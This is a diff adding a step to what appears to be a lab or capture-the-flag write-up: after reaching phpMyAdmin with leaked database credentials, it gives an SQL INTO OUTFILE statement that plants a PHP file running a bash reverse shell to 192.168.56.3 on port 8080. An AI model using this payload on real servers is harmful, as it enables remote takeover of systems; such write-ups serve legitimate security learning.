@@ -129,3 +129,8 @@ There's a mail with db access
 
 We can connect to the phpmyadmin dashboard
 
+From here you can launch a reverse shell
+
+```sql
+SELECT "<?= exec('/bin/bash -c \"bash -i 2>&1 > /dev/tcp/192.168.56.3/8080 0>&1 \"');" INTO OUTFILE '/var/www/forum/templates_c/7.php'
+```
